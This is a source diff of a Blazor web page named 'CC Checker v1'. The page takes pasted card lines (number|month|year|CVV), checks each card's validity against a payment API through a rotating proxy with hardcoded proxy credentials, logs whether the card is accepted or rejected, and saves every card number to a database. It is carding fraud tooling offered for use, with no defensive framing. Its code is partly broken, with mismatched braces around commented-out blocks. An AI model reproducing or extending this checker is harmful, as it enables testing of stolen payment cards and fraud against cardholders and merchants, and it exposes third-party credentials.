@@ -1,5 +1,13 @@
 ﻿@page "/cccheker"
 
+@using BlazorApp.Models
+@using BlazorApp.gfc
+@using DataLibrary
+@using System.Net
+@using Newtonsoft.Json.Linq
+@inject IDataAccess _data
+@inject IConfiguration _config
+
 <PageTitle>CC Checker v1</PageTitle>
 
 <div class=".panel-body"> 
@@ -10,7 +18,7 @@
                          </div> 
                          <div class="col-xs-3 col-sm-3 col-md-3 col-lg-3 col-md-offset-5"> 
                                  <div class="form-group"> 
-                                     <button name="valid" class="btn btn-success" @onclick="Start" >Start</button> 
+                                     <button name="valid" class="btn btn-success" @onclick="StartNew" >Start</button> 
                                  <button id="stop" class="btn btn-danger" >Stop</button> 
                          </div> 
                  </div> 
@@ -20,39 +28,205 @@
 
 
 @code {
-  
-    
-   // public  List<string> CcList = new List<string>{};
+
+
+    // public  List<string> CcList = new List<string>{};
     public virtual List<CcListUsedStrings> CcListUsed { get; set; } = new ();
     private string textcc { get; set; }
     private int currentCount = 0;
     private void IncrementCountog()
     {
         currentCount++;
-        
+
     }
 
     //starts the cc checker using string from textarea
     private  async Task Start()
     {
-       gfc.CccheckerWK ccchecker = new gfc.CccheckerWK();
-     string[] textLines = textcc.Split(new[]{ Environment.NewLine }, StringSplitOptions.None);
+        gfc.CccheckerWK ccchecker = new gfc.CccheckerWK();
+        if (textcc == null){ return; }
 
-     
-       var x = "";
-      foreach(var ln in textLines){
-        if(ln.Length == 28 ){
-          x= x + ln + Environment.NewLine;
-        var y = new CcListUsedStrings();
-        y.StringValue = x;
-       CcListUsed.Add(y);
+        string[] textLines = textcc.Split(new[]{ Environment.NewLine }, StringSplitOptions.None);
+
+
+        var x = "";
+        foreach(var ln in textLines){
+            if(ln.Length == 28 ){
+                x= x + ln + Environment.NewLine;
+                var y = new CcListUsedStrings();
+                y.StringValue = x;
+                CcListUsed.Add(y);
+            }
+
+            string sql = "insert into Cards (ccNun, AddByUser) values (@ccNun, @AddByUser)";
+
+            await _data.SaveData(sql, new { ccNun = ln, AddByUser = "Admin" },_config.GetConnectionString("Default"));
+
+            await  OnInitializedAsync();
+
         }
-       
-      }0
-    //ccchecker.Start(textcc);
-      
-       textcc = "";
+        //ccchecker.Start(textcc);
+
+        textcc = "";
+
+
+
+
+
+
     }
+
+    Boolean sp = false;
+    private  async Task StartNew(){
+
+        CccheckerWK cccheckerWK = new CccheckerWK();
+        string muid, guid, sid,cs_live;
+
+        var proxy = new WebProxy
+            {
+                Address = new Uri($"http://p.webshare.io:80"),
+                // Address = new Uri($"http://{proxyHost}:{proxyPort}"),
+                BypassProxyOnLocal = false,
+                UseDefaultCredentials = false,
+
+                // *** These creds are given to the proxy server, not the web server ***
+                Credentials = new NetworkCredential(
+                    userName: "nbjecvwi-rotate",
+                    password: "o3hm7zjkand0")
+            };
+
+        // Now create a client handler which uses that proxy
+        var httpClientHandler = new HttpClientHandler
+            {
+                Proxy = proxy,
+            };
+
+        //   HttpClient HC = new HttpClient();
+        var HC = new HttpClient(handler: httpClientHandler, disposeHandler: true);
+
+
+        sp = false;
+
+        if (textcc != "")
+        {
+
+            if (sp == false)
+            {
+
+                try
+                {
+                    string cc = textcc;
+                    string[] linha = cc.Split('|');
+                    string mess = formatMes(linha[1]);
+                    ;
+                    var resposta1 = await cccheckerWK._func01(HC);
+
+
+
+                    dynamic data = JObject.Parse(resposta1);
+
+                    muid = Convert.ToString(data["muid"]);
+                    guid = Convert.ToString(data["guid"]);
+                    sid = Convert.ToString(data["sid"]);
+                    //  MessageBox.Show(resposta1);
+                    //string con = await consulta(linha[0].Substring(0, 6)); //bin check
+                    //  Console.WriteLine(con);
+
+                    //  var payment_page = await getPageCsLive();
+
+                    //dynamic paymentdata = JObject.Parse(payment_page);
+                    //   MessageBox.Show("lol" + payment_page +"\n ");
+                    //cs_live = Convert.ToString(data["muid"]);
+
+                    var resposta2 = await cccheckerWK._func02(HC, linha[0], mess, linha[2], linha[3], muid, guid, sid);
+
+
+                    dynamic data2 = JObject.Parse(resposta2);
+                    string id = Convert.ToString(data2["id"]);
+
+                    if(resposta2.Contains("incorrect_number"))
+                    {
+                        if (data2["error"]["code"] == "incorrect_number")
+                        {
+                            //  ccExceptions m = new ccExceptions("incorrect_number");
+                         //   m.ExtraErrorInfo = $"{data2["error"]["Message"]}";
+                           // throw m;
+                            Console.WriteLine( $"{data2["error"]["Message"]}");
+                        }
+                    }
+                    else
+                    {
+                      
+                        Console.WriteLine(id);
+                    }
+                           
+                    /*
+                                var resposta3 = await charge(HC, id);
+                            dynamic data3 = JObject.Parse(resposta3);
+                            string msg0 = Convert.ToString(data3["error"]["code"]);
+                            string msg1 = Convert.ToString(data3["error"]["decline_code"]);
+
+
+                            //MessageBox.Show($"Error: {msg0} - {msg1}");
+                            MessageBox.Show($"Error: {data3}");
+                            List<string> newList = lista.Lines.ToList();
+                            newList.RemoveAt(0);
+                            lista.Lines = newList.ToArray();
+                        }
+                        catch (ccExceptions cc)
+                        {
+                            List<string> newList = lista.Lines.ToList();
+                            if (cc.Message.Contains("incorrect_number"))
+                            {
+                                 rp.Text += "REPROVADA ❌ " + "" + Environment.NewLine;
+                                 //rp.Text += "REPROVADA ❌ " + cc + con + Environment.NewLine;
+                                newList.RemoveAt(0);
+                                lista.Lines = newList.ToArray();
+                            }
+
+                            
+                        }
+                        catch (HttpRequestException ex1)
+                        {
+
+                            if (ex1.Message.Contains("429 (Too Many Requests)"))
+                            {
+                                Thread.Sleep(5000);
+                            }
+
+                            Console.WriteLine(ex1);
+                            */
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("weed");
+                            Console.WriteLine(ex);
+                        }
+
+
+                    }
+                }
+            
+
+
+             await  OnInitializedAsync();
+        }
+
+         private string formatMes(string mess)
+        {
+            string m = mess;
+            if (mess.Length == 2 && mess != "10" && mess != "11" && mess != "12")
+            {
+                m = mess.Replace("0", "");
+            }
+            else
+            {
+                return m;
+            }
+
+            return m;
+        }
+
  private bool IsCcFormat(string str)
         {
          
@@ -89,4 +263,34 @@
 </table>
 }
 
+
+@if(CC ==  null){
+ 
+    <p><em>Loading...</em></p>
+
+}else
+{
+    @foreach (var c in CC)
+    {
+        <p>
+            @c.ccNun 
+        </p>
+    }
+}
+
+
+
+@code{
+
+    List<CardsModel> CC;
+
+    protected override async Task OnInitializedAsync()
+    {
+        string sql = "select * from Cards";
+
+        CC = await _data.LoadData<CardsModel, dynamic>(sql, new{}, _config.GetConnectionString("Default"));
+        
+
+    }
+}
 
